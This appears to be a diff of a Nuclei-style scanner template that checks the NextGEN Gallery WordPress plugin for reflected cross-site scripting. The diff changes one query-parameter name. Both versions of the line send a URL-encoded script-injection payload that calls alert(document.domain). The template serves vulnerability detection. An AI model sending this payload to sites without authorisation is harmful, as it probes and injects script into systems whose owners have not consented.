@@ -17,7 +17,7 @@ info:
 requests:
   - method: GET
     path:
-      - '{{BaseURL}}/wp-content/plugins/nextgen-gallery/nggallery.php?test-head=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
+      - '{{BaseURL}}/wp-content/plugins/nextgen-gallery/nggallery.php?testnmanp-head=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
 
     matchers-condition: and
     matchers:
